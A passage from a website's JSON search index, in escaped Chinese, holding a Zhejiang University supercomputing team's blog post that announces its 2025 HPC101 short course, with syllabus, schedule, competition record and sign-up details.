<p>\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u4e16\u754c\u6700\u5feb\u7684\u8d85\u7ea7\u8ba1\u7b97\u673a Frontier\uff0c\u6bcf\u79d2\u53ef\u6267\u884c \u8d85\u8fc7\u767e\u4ebf\u4ebf\u6b21\u6d6e\u70b9\u8fd0\u7b97\uff0c\u76f8\u5f53\u4e8e \u6570\u4e07\u5f20 RTX 4090 \u663e\u5361 \u540c\u65f6\u201c\u6ee1\u529f\u7387\u71c3\u70e7\u201d\ud83d\udd25\u3002</p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-hpc-\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u5feb","title":"\ud83d\udca1 HPC \u4e3a\u4ec0\u4e48\u8fd9\u4e48\u5feb\uff1f","text":"<p>\u4f20\u7edf\u8ba1\u7b97\u673a\u4f7f\u7528\u4e32\u884c\u8ba1\u7b97 \u2014\u2014 \u4e00\u4e2a\u4efb\u52a1\u4e00\u4e2a\u4efb\u52a1\u6162\u6162\u6267\u884c\u3002</p> <p>\u800c HPC \u4f7f\u7528\u7684\u662f\uff1a</p> <ul> <li>\u5e76\u884c\u8ba1\u7b97\uff1a \u4efb\u52a1\u5728\u6570\u5343\u4e0a\u4e07\u4e2a\u6838\u5fc3\u4e0a\u5e76\u884c\u8fd0\u884c</li> <li>\u8ba1\u7b97\u96c6\u7fa4\uff1a \u4e0a\u767e\u53f0\u670d\u52a1\u5668\u7ec4\u6210\u8d85\u7ea7\u201c\u5927\u8111\u201d</li> <li>\u9ad8\u901f\u4e92\u8054\u4e0e\u8c03\u5ea6\u7cfb\u7edf\uff1a \u4efb\u52a1/\u5b58\u50a8/\u901a\u4fe1\u5168\u94fe\u6761\u4f18\u5316</li> </ul>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-hpc-\u7528\u5728\u54ea","title":"\ud83d\udd27 HPC \u7528\u5728\u54ea\uff1f","text":"<p>HPC \u6b63\u5728\u52a0\u901f\u4e16\u754c\u7684\u8fdb\u6b65\uff0c\u5e94\u7528\u573a\u666f\u5305\u62ec\uff1a</p> <ul> <li>\ud83d\udd2c \u79d1\u5b66\u6a21\u62df\uff1a \u5929\u6c14\u9884\u62a5\u3001\u6c14\u5019\u53d8\u5316\u3001\u5b87\u5b99\u5efa\u6a21\u3001\u57fa\u56e0\u6d4b\u5e8f</li> <li>\ud83e\uddec \u533b\u7597\u5065\u5eb7\uff1a \u836f\u7269\u7814\u53d1\u3001\u764c\u75c7\u8bca\u65ad\u3001\u4eba\u7c7b\u57fa\u56e0\u7ec4\u6d4b\u5e8f</li> <li>\ud83d\udcb0 \u91d1\u878d\u98ce\u63a7\uff1a \u98ce\u9669\u6a21\u62df\u3001\u81ea\u52a8\u4ea4\u6613\u3001\u6b3a\u8bc8\u68c0\u6d4b</li> <li>\ud83d\udee1\ufe0f \u56fd\u5bb6\u5b89\u5168\uff1a \u56fd\u9632\u6a21\u62df\u3001\u80fd\u6e90\u4eff\u771f\u3001\u60c5\u62a5\u5206\u6790</li> <li>\ud83e\udd16 AI \u8bad\u7ec3\uff1a DeepSeek\u3001\u56fe\u50cf\u8bc6\u522b\u3001\u81ea\u7136\u8bed\u8a00\u5904\u7406\u7b49\u7684\u5e95\u5c42\u652f\u6491</li> </ul>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u8bfe\u7a0b\u5bfc\u89c8hpc101\u6211\u4eec\u6559\u4f60\u8fd9\u4e9b","title":"\u8bfe\u7a0b\u5bfc\u89c8\uff1aHPC101\uff0c\u6211\u4eec\u6559\u4f60\u8fd9\u4e9b","text":""},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u524d\u7f6e\u77e5\u8bc6\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u4e0e\u7cfb\u7edf","title":"\u2705 \u524d\u7f6e\u77e5\u8bc6\uff1a\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u4e0e\u7cfb\u7edf","text":"<p>\u4f60\u5c06\u4e86\u89e3\uff1a</p> <ul> <li>CPU/GPU \u67b6\u6784\u4e0e\u8c03\u5ea6</li> <li>Cache \u4e00\u81f4\u6027\u3001SIMD \u4f18\u5316</li> <li>Shared Memory\u3001Bank \u51b2\u7a81\u673a\u5236</li> </ul>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u6838\u5fc3\u6280\u80fd\u5e76\u884c\u7f16\u7a0b\u4e09\u5927\u6280\u672f\u6808","title":"\u2705 \u6838\u5fc3\u6280\u80fd\uff1a\u5e76\u884c\u7f16\u7a0b\u4e09\u5927\u6280\u672f\u6808","text":"<ul> <li>OpenMP / MPI\uff08CPU \u5e76\u884c\u7f16\u7a0b\uff09</li> <li>CUDA C\uff08GPU \u5e76\u884c\u7f16\u7a0b\uff09</li> <li>\u5e76\u884c\u7b97\u6cd5\u8bbe\u8ba1\u4e0e\u8c03\u4f18\u6280\u5de7</li> </ul>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u5de5\u5177\u94fe\u8bad\u7ec3","title":"\u2705 \u5de5\u5177\u94fe\u8bad\u7ec3","text":"<p>\u6211\u4eec\u51c6\u5907\u4e86 Lab 0\uff1aLinux Crash Course</p> <ul> <li>Shell \u6307\u4ee4\u64cd\u4f5c</li> <li>\u4f7f\u7528 Slurm \u63d0\u4ea4\u4efb\u52a1</li> <li>\u7528 Spack/Lmod \u7ba1\u7406\u73af\u5883</li> </ul>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u8bfe\u7a0b\u5b89\u6392-","title":"\u8bfe\u7a0b\u5b89\u6392 \ud83d\uddd3\ufe0f","text":"\u65f6\u95f4 \u5185\u5bb9 \u8bb2\u5e08 6.25 \u8d85\u7b97\u6982\u8ff0 \u9648\u5efa\u6d77 6.26 \u96c6\u7fa4\u8f6f\u786c\u4ef6\u4e0e\u8fd0\u7ef4 \u90dd\u661f\u661f 6.27 HPC \u4e2d\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf - 1 \u674e\u6668\u6f47 6.28 HPC \u4e2d\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf - 2 \u4f55\u6c34\u5175 / \u6f58\u54f2 6.30 \u5411\u91cf\u5316\u5e76\u884c\u8ba1\u7b97\u57fa\u7840 \u9648\u5b8f\u54f2 7.1 CUDA C \u7f16\u7a0b\u57fa\u7840 \u738b\u5219\u53ef / \u9648\u9534\u742a 7.2 OpenMP/MPI \u5e76\u884c\u7f16\u7a0b \u674e\u6668\u6f47 7.3 \u9ad8\u6027\u80fd\u8ba1\u7b97\u9ad8\u7ea7\u8bdd\u9898 \u738b\u5219\u53ef 7.5 Profiling \u6027\u80fd\u5206\u6790 \u6731\u5b9d\u6797 7.6 \u673a\u5668\u5b66\u4e60\u57fa\u7840 \u6797\u7199 7.7 \u673a\u5668\u5b66\u4e60\u9ad8\u7ea7\u8bdd\u9898 \u5f20\u5bc5 <p>\ud83d\udca4 6.29 &amp; 7.4 \u4e3a\u4f11\u606f\u65e5 \ud83d\udccc \u8bfe\u7a0b\u5b89\u6392\u53ef\u80fd\u7565\u6709\u8c03\u6574</p> <p>\u8d85\u7b97\u77ed\u5b66\u671f\u8bfe\u7a0b\u7531\u7ecf\u9a8c\u4e30\u5bcc\u7684\u5b66\u957f\u6559\u5b66\u56e2\u961f\u4e3b\u5bfc\uff0c\u6db5\u76d6\u6388\u8bfe\u3001\u5b9e\u9a8c\u53ca\u8bc4\u5206\u5168\u8fc7\u7a0b\uff0c\u540c\u65f6\u7531\u6307\u5bfc\u8001\u5e08\u90e8\u5206\u53c2\u4e0e\u6388\u8bfe\uff0c\u786e\u4fdd\u5185\u5bb9\u7684\u4e13\u4e1a\u6027\u4e0e\u524d\u6cbf\u6027\u3002\u6211\u4eec\u81f4\u529b\u4e8e\u8425\u9020\u8f7b\u677e\u9ad8\u6548\u7684\u5b66\u4e60\u6c1b\u56f4\uff0c\u8ba9\u4f60\u5728\u6109\u5feb\u7684\u4f53\u9a8c\u4e2d\u638c\u63e1\u786c\u6838\u77e5\u8bc6\u3002\u5386\u5e74\u8bfe\u7a0b\u7684\u5e73\u5747\u5206\u9ad8\u8fbe 92 \u5206\u4ee5\u4e0a\uff0c\u6df1\u53d7\u540c\u5b66\u4eec\u6b22\u8fce\u3002</p> <p>\u8fd9\u4e0d\u4ec5\u662f\u4e00\u95e8\u8bfe\u7a0b\uff0c\u66f4\u662f\u4f60\u901a\u5f80\u4e13\u4e1a\u5b66\u4e60\u6df1\u5904\u7684\u6572\u95e8\u7816\u3002\u4f60\u5c06\u5728\u8fd9\u91cc\u63d0\u524d\u63a5\u89e6\u8ba1\u7b97\u673a\u7cfb\u7edf\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4f53\u7cfb\u7ed3\u6784\u3001\u7f16\u8bd1\u539f\u7406\u7b49\u6838\u5fc3\u8bfe\u7a0b\u77e5\u8bc6\uff0c\u751a\u81f3\u53ef\u80fd\u9082\u9005\u672a\u6765\u8fd9\u4e9b\u8bfe\u7684\u52a9\u6559\u3002</p> <p>\u6211\u4eec\u4e5f\u6b22\u8fce\u6765\u81ea\u975e\u8ba1\u7b97\u673a\u4e13\u4e1a\u7684\u540c\u5b66\u52a0\u5165\uff01\u5728\u5b9e\u9645\u7ade\u8d5b\u4e2d\uff0c\u8bf8\u5982\u751f\u7269\u4fe1\u606f\u3001\u5730\u7406\u4fe1\u606f\u3001\u7269\u7406\u3001\u5e94\u7528\u6570\u5b66\u7b49\u80cc\u666f\u7684\u961f\u5458\uff0c\u5728\u9762\u5bf9\u4ea4\u53c9\u8d5b\u9898\u65f6\u5f80\u5f80\u80fd\u63d0\u4f9b\u72ec\u7279\u7684\u89c6\u89d2\u4e0e\u7406\u89e3\u65b9\u5f0f\uff0c\u4e3a\u961f\u4f0d\u5e26\u6765\u610f\u60f3\u4e0d\u5230\u7684\u7a81\u7834\u3002\u6211\u961f\u4e2d\u5c31\u6709\u591a\u4f4d\u975e\u8ba1\u79d1\u4e13\u4e1a\u6210\u5458\uff0c\u6b63\u627f\u62c5\u7740\u5173\u952e\u89d2\u8272\uff0c\u5c55\u73b0\u51fa\u5353\u8d8a\u7684\u80fd\u529b\u3002</p> <p>\u6b64\u5916\uff0c\u901a\u8fc7\u5b9e\u8df5\u8bad\u7ec3\uff0c\u4f60\u5c06\u83b7\u5f97\u5b9d\u8d35\u7684\u6027\u80fd\u4f18\u5316\u76f4\u89c9\u4e0e\u5de5\u7a0b\u7d20\u517b\uff0c\u63d0\u5347\u5bf9\u4ee3\u7801\u6548\u7387\u3001\u8d44\u6e90\u8c03\u5ea6\u7b49\u95ee\u9898\u7684\u654f\u611f\u5ea6\uff0c\u8fd9\u4e9b\u80fd\u529b\u5c06\u5728\u672a\u6765\u79d1\u7814\u6216\u5de5\u7a0b\u5b9e\u8df5\u4e2d\u6301\u7eed\u4e3a\u4f60\u8d4b\u80fd\u3002</p> <p>\u5bf9\u8bfe\u7a0b\u5185\u5bb9\u3001\u8282\u594f\u6216\u6280\u672f\u7ec6\u8282\u6709\u7591\u95ee\uff1f\u6b22\u8fce\u5728\u8bfe\u7a0b\u4ea4\u6d41\u7fa4\u4e2d\u76f4\u63a5\u5411\u6388\u8bfe\u5b66\u957f\u63d0\u95ee\uff0c\u6211\u4eec\u5c06\u70ed\u60c5\u89e3\u7b54\uff0c\u52a9\u4f60\u65e0\u5fe7\u8d77\u822a\u3002</p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u8c01\u9002\u5408\u8fd9\u95e8\u8bfe","title":"\u8c01\u9002\u5408\u8fd9\u95e8\u8bfe\uff1f","text":"<p>\u2705 \u60f3\u63d0\u524d\u4e86\u89e3\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u7684\u4f60</p> <p>\u2705 \u5bf9\u5e76\u884c\u7f16\u7a0b\u3001AI\u3001\u7cfb\u7edf\u611f\u5174\u8da3\u7684\u4f60</p> <p>\u2705 \u60f3\u8d70\u79d1\u7814\u3001\u7cfb\u7edf\u3001\u7b97\u6cd5\u65b9\u5411\u7684\u4f60</p> <p>\u2705 \u60f3\u6311\u6218\u81ea\u6211\u3001\u4e0d\u6015\u96be\u9898\u7684\u4f60\uff01</p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u6d59\u5927\u8d85\u7b97\u961f\u5c06\u5174\u8da3\u53d8\u4e3a\u5b9e\u529b\u7684\u5730\u65b9","title":"\u6d59\u5927\u8d85\u7b97\u961f\uff1a\u5c06\u5174\u8da3\u53d8\u4e3a\u5b9e\u529b\u7684\u5730\u65b9","text":"<p>HPC \u542c\u8d77\u6765\u5f88\u9177\uff0c\u4f46\u4f60\u53ef\u80fd\u4f1a\u62c5\u5fc3\uff1a\u201c\u8fd9\u4e1c\u897f\u6211\u771f\u7684\u80fd\u63a5\u89e6\u5230\u5417\uff1f\u201d\u5728\u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f\uff0c\u6211\u4eec\u8bf4\u7684\u4e0d\u662f\u7a7a\u8bdd\uff0c\u800c\u662f\u5b9e\u6253\u5b9e\u7684\u5b9e\u673a\u7ec3\u4e60\u4e0e\u771f\u5b9e\u4f53\u9a8c\u3002</p> <p></p> <p>\u26a0\ufe0f \u77ed\u5b66\u671f\u662f\u6211\u4eec\u9009\u62d4\u5927\u4e00\u65b0\u751f\u52a0\u5165\u8d85\u7b97\u961f\u7684\u4e3b\u8981\u9014\u5f84\uff0c\u901a\u8fc7\u8bfe\u7a0b\u5b66\u4e60\u548c\u5b9e\u8df5\u8868\u73b0\u8fdb\u884c\u521d\u6b65\u7b5b\u9009\u4e0e\u8003\u6838\u3002\u5982\u679c\u4f60\u60f3\u52a0\u5165\u8d85\u7b97\u961f\uff0c\u8bf7\u52a1\u5fc5\u4e0d\u8981\u9519\u8fc7\u8fd9\u6b21\u5b9d\u8d35\u7684\u673a\u4f1a\uff01</p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u9876\u7ea7\u786c\u4ef6\u624b\u628a\u624b\u63a5\u89e6\u8d85\u7ea7\u8ba1\u7b97","title":"\ud83e\uddea \u9876\u7ea7\u786c\u4ef6\uff0c\u624b\u628a\u624b\u63a5\u89e6\u8d85\u7ea7\u8ba1\u7b97","text":"<p>\ud83d\udccd\u5728\u7d2b\u91d1\u6e2f\u4e1c\u56db\u6559\u5b66\u697c\uff0c\u6211\u4eec\u62e5\u6709\uff1a</p> <ul> <li>\u8d85\u8fc7\u5341\u53f0 \u9ad8\u6027\u80fd\u670d\u52a1\u5668\uff0c\u5168\u6743\u7531\u961f\u5458\u7ba1\u7406\u4e0e\u7ef4\u62a4</li> <li>\u591a\u8282\u70b9\u5f02\u6784\u8ba1\u7b97\u96c6\u7fa4\uff08\u542b CPU + GPU\uff09</li> <li>NVIDIA A100 \u7b49\u4e3b\u6d41\u8ba1\u7b97\u5361\u4f9b\u4e0a\u673a\u5b9e\u9a8c</li> <li>\u4e13\u5c5e\u5b9e\u9a8c\u5ba4\u4e0e\u5de5\u4f5c\u73af\u5883\uff0c\u652f\u6301\u5b8c\u6574 HPC \u5b66\u4e60\u6d41\u7a0b</li> </ul> <p> </p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u6211\u4eec\u6709\u4e30\u5bcc\u6210\u679c\u8ba9\u5174\u8da3\u771f\u6b63\u843d\u5730","title":"\ud83c\udfc6 \u6211\u4eec\u6709\u4e30\u5bcc\u6210\u679c\uff0c\u8ba9\u5174\u8da3\u771f\u6b63\u843d\u5730","text":"<p>\u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f\u81ea\u7ec4\u5efa\u4ee5\u6765\uff0c\u6210\u7ee9\u6590\u7136\uff1a</p> <ul> <li>\ud83c\udfc6 2025 ASC \u5168\u7403\u603b\u51b3\u8d5b \u4e00\u7b49\u5956\uff08\u7b2c4\u540d\uff09&amp; \u5e94\u7528\u521b\u65b0\u5956</li> <li>\ud83c\udfc6 2024 ASC \u5168\u7403\u603b\u51b3\u8d5b \u4e00\u7b49\u5956\uff08\u7b2c4\u540d\uff09&amp; Linpack \u4e16\u754c\u6700\u9ad8\u6027\u80fd</li> <li>\ud83c\udf0d 2024 ISC \u4e16\u754c\u5927\u5b66\u751f\u8d85\u7b97\u7ade\u8d5b \u7b2c\u4e94\u540d</li> <li>\ud83e\udd47 2023 IndySCC \u5168\u7403\u51a0\u519b</li> <li>\ud83c\udfc5 2023 ASC \u5168\u7403\u603b\u51b3\u8d5b \u4e00\u7b49\u5956\uff08\u7b2c4\u540d\uff09&amp; Linpack \u4e16\u754c\u6700\u9ad8\u6027\u80fd</li> <li>\ud83e\udd49 2022 ACM-China IPCC \u5168\u56fd\u4e09\u7b49\u5956\uff08\u7b2c6\u540d\uff09</li> <li>\ud83c\udf1f 2022 SC \u4e16\u754c\u5927\u5b66\u751f\u8d85\u7b97\u7ade\u8d5b \u7b2c\u56db\u540d</li> <li>\ud83d\udcc8 \u5386\u5c4a ASC\u3001ISC\u3001SC\u3001PAC \u7b49\u8d5b\u4e8b\u5171\u8ba1\u5341\u4f59\u6b21\u4e00/\u4e8c\u7b49\u5956</li> <li>\ud83c\udf96\ufe0f \u591a\u6b21\u6253\u7834 Linpack \u6027\u80fd\u7eaa\u5f55\uff0c\u6210\u4e3a\u56fd\u9645\u7ade\u8d5b\u4e2d\u7684\u4e2d\u56fd\u4ee3\u8868\u529b\u91cf</li> <li>\ud83e\udde0 \u5c06\u7ade\u8d5b\u6210\u679c\u8f6c\u5316\u4e3a \u4e09\u7bc7\u6b63\u5f0f\u79d1\u7814\u8bba\u6587</li> <li>\ud83d\udd27 \u8d1f\u8d23\u6d59\u5927\u6821\u5185 Git \u670d\u52a1\u4e0e\u955c\u50cf\u670d\u52a1\uff0c\u6280\u672f\u80fd\u529b\u76f4\u63a5\u670d\u52a1\u6821\u56ed</li> </ul> <p>\u8fd9\u4e9b\u90fd\u4e0d\u4ec5\u4ec5\u662f\u8363\u8a89\uff0c\u66f4\u662f\u6211\u4eec\u7684\u961f\u5458\u5728\u5b9e\u6218\u4e2d\u6210\u957f\u3001\u8fdb\u9636\u3001\u521b\u65b0\u7684\u89c1\u8bc1\u3002</p> <p> </p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u6211\u4eec\u6709\u9876\u5c16\u5e73\u53f0\u548c\u5e7f\u9614\u51fa\u53e3","title":"\ud83c\udf10 \u6211\u4eec\u6709\u9876\u5c16\u5e73\u53f0\u548c\u5e7f\u9614\u51fa\u53e3","text":"<ul> <li>\ud83d\udcaf \u4eab\u6709\u5b66\u6821\u548c\u5b66\u9662\u7684\u7ade\u8d5b\u4fdd\u7814\u52a0\u5206\u8ba4\u5b9a</li> <li>\ud83c\udf93 \u961f\u5458\u4e2d\u6709\u591a\u4eba\u4fdd\u7814\u6e05\u5317\u3001\u6d59\u5927\uff0c\u6216\u8d74 CMU\u3001UCSD\u3001SFU \u7b49\u6d77\u5916\u540d\u6821\u6df1\u9020</li> <li>\ud83d\udcbc \u4e0e \u82f1\u4f1f\u8fbe\u3001\u534e\u4e3a\u3001\u963f\u91cc\u5df4\u5df4 \u7b49\u4f01\u4e1a\u4fdd\u6301\u826f\u597d\u8054\u7cfb\uff0c\u53c2\u8bbf\u3001\u5b9e\u4e60\u673a\u4f1a\u4e30\u5bcc</li> <li>\ud83e\uddd1\u200d\ud83c\udfeb \u591a\u4f4d\u961f\u5458\u5728\u5927\u4e8c\u3001\u5927\u4e09\u9636\u6bb5\u5c31\u83b7\u5f97\u79d1\u7814\u52a9\u7814\u673a\u4f1a</li> </ul> <p>\u6211\u4eec\u4e0d\u53ea\u662f\u7ade\u8d5b\u961f\uff0c\u66f4\u662f\u4e00\u4e2a\u8fde\u63a5\u6821\u56ed\u4e0e\u4ea7\u4e1a\u3001\u5b66\u672f\u7684 \u9ad8\u6027\u80fd\u8ba1\u7b97\u5b9e\u8df5\u5171\u540c\u4f53\u3002</p> <p> </p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u6211\u4eec\u662f\u6280\u672f\u7231\u597d\u8005\u7684\u4e4c\u6258\u90a6","title":"\ud83c\udf0d \u6211\u4eec\u662f\u6280\u672f\u7231\u597d\u8005\u7684\u4e4c\u6258\u90a6","text":"<ul> <li>\ud83d\udcda \u6bcf\u5468\u6280\u672f\u4f8b\u4f1a + \u5206\u4eab\u5236\u5ea6\uff0c\u8bba\u6587/\u7ecf\u9a8c/PPT/\u6e90\u7801\u81ea\u7531\u4ea4\u6d41</li> <li>\ud83c\udf55 \u5976\u8336\u62ab\u8428\u4e0d\u65ad\uff0c\u56e2\u961f\u805a\u9910\u9891\u7e41\uff0c\u6c1b\u56f4\u8f7b\u677e\u6709\u8da3</li> <li>\ud83e\uddd1\u200d\ud83d\udd2c \u65e0\u8bba\u4f60\u662f\u7cfb\u7edf\u5de5\u7a0b\u63a7\u3001\u7b97\u6cd5\u5f00\u53d1\u8005\u3001AI \u73a9\u5bb6\u8fd8\u662f\u79d1\u7814\u72c2\u70ed\u8005\uff0c\u90fd\u80fd\u627e\u5230\u4f19\u4f34</li> </ul> <p>\u6211\u4eec\u76f8\u4fe1\u771f\u6b63\u7684\u6210\u957f\u6765\u81ea \u5174\u8da3\u9a71\u52a8\u7684\u81ea\u7531\u63a2\u7d22 + \u5b9e\u8df5\u9a71\u52a8\u7684\u6df1\u5ea6\u6c89\u6dc0\u3002</p> <p> </p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u5982\u4f55\u62a5\u540d","title":"\u5982\u4f55\u62a5\u540d\uff1f","text":"<p>\ud83d\udea8 \u672c\u8bfe\u7a0b \u4e0d\u901a\u8fc7\u9009\u8bfe\u7cfb\u7edf\u62a5\u540d\uff0c\u52a1\u5fc5\u63d0\u524d\u63d0\u4ea4\u62a5\u540d\u6750\u6599\uff1a</p> <p>\ud83d\udce9 \u62a5\u540d\u90ae\u7bb1\uff1a <code>mail@zjusct.io</code></p> <p>\ud83d\uddd3\ufe0f \u622a\u6b62\u65f6\u95f4\uff1a5 \u6708 30 \u65e5\u665a 23:59</p> <p>\ud83d\udd16 \u90ae\u4ef6\u683c\u5f0f\u8981\u6c42\uff1a</p> <ul> <li>\u6807\u9898\uff1a\u30102025 \u77ed\u5b66\u671f\u62a5\u540d\u8868\u3011\u59d3\u540d \u5b66\u53f7\uff08\u4f8b\uff1a\u5f20\u4e09 3220100001\uff09</li> <li>\u5185\u5bb9\uff1a\u8054\u7cfb\u65b9\u5f0f\uff08\u90ae\u7bb1\u3001\u7535\u8bdd\u3001QQ\u3001\u5fae\u4fe1\u7b49\uff09</li> <li>\u9644\u4ef6\uff1aLab 1\uff08MiniCluster\uff09\u5b9e\u9a8c\u62a5\u544a \u6216 \u4e2a\u4eba\u7b80\u4ecb\uff08\u4e8c\u9009\u4e00\uff0c\u9f13\u52b1\u540c\u65f6\u63d0\u4ea4\uff09</li> </ul> <p>\ud83d\udcce \u9644\u52a0\u63a8\u8350\u6750\u6599\uff1a</p> <ul> <li>Lab 0\uff08Linux Crash Course\uff09 \u7ed3\u679c\uff08\u53ef\u9009\uff09</li> </ul> <p>\ud83d\udcac \u4e00\u8d77\u804a\u804a\uff1a\u6211\u4eec\u5e0c\u671b\u540c\u6bcf\u4e00\u4f4d\u5e0c\u671b\u4fee\u8bfb\u8be5\u8bfe\u7a0b\u7684\u540c\u5b66\u804a\u804a\u5929\uff0c\u8bf7\u4e0d\u8981\u5c06\u8be5\u73af\u8282\u5f53\u4f5c\u9762\u8bd5\u3002\u8bf7\u5728\u8bfe\u7a0b\u7f51\u7ad9\uff08\u89c1\u4e0b\u6587\uff09\u63d0\u4f9b\u7684 Schej \u94fe\u63a5\u4e2d\u9009\u62e9\u4f60\u65b9\u4fbf\u7684\u65f6\u95f4\u6bb5\uff0c\u5e76\u5728\u90ae\u4ef6\u5185\u8bf4\u660e\uff0c\u65b9\u4fbf\u6211\u4eec\u5b89\u6392\u65f6\u95f4\u3002\u5c06\u4ee5\u7fa4\u804a\u7684\u5f62\u5f0f\u8fdb\u884c\uff0c\u6bcf\u573a\u7ea6\u534a\u5c0f\u65f6\u3002</p> <p>\ud83d\udccc \u6211\u4eec\u5c06\u4f18\u5148\u8003\u8651\u63d0\u4ea4\u5b9e\u9a8c\u62a5\u544a\u7684\u540c\u5b66\u3002\u5b9e\u9a8c\u5b8c\u6210\u5ea6\u5c06\u4f5c\u4e3a\u9009\u62d4\u7684\u91cd\u8981\u53c2\u8003\u56e0\u7d20\u4e4b\u4e00\u3002</p> <p>\ud83d\udeab \u8bf7\u4e0d\u8981\u5728\u4e00\u8f6e\u3001\u4e8c\u8f6e\u9009\u8bfe\u4e2d\u9009\u5176\u4ed6\u300c\u8bfe\u7a0b\u7efc\u5408\u5b9e\u8df5\u2160\u300d\u8bfe\u7a0b\uff0c\u907f\u514d\u51b2\u7a81\uff01</p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u52a0\u5165\u8bfe\u7a0b\u4ea4\u6d41\u7fa4","title":"\u52a0\u5165\u8bfe\u7a0b\u4ea4\u6d41\u7fa4","text":"<p>\ud83d\udcf7 \u626b\u7801\u52a0\u5165\u300c2025 HPC101 \u77ed\u5b66\u671f\u4ea4\u6d41\u7fa4\u300d</p> <p>\u83b7\u53d6\u5b9e\u65f6\u901a\u77e5\u3001\u7b54\u7591\u89e3\u60d1\u3001\u4ea4\u6d41\u5206\u4eab\uff01</p> <p>\u8bfe\u7a0b\u7fa4\u53f7\uff5c698275209</p> <p>\u7f51\u7ad9\uff5chpc101.zjusct.io</p> <p></p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u5f80\u5c4a\u98ce\u91c7-","title":"\u5f80\u5c4a\u98ce\u91c7 \u2728","text":""},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u4e00\u70b9\u5efa\u8bae--\u4e00\u53e5\u771f\u5fc3\u8bdd","title":"\u4e00\u70b9\u5efa\u8bae &amp; \u4e00\u53e5\u771f\u5fc3\u8bdd","text":"\u8fd9\u95e8\u8bfe\u96be\u5417\uff1f\u786e\u5b9e\u6709\u70b9\u3002  \u77e5\u8bc6\u591a\u5417\uff1f\u4e0d\u5c11\u3002  \u6536\u83b7\u5927\u5417\uff1f\u975e\u5e38\uff01  HPC101 \u662f CS 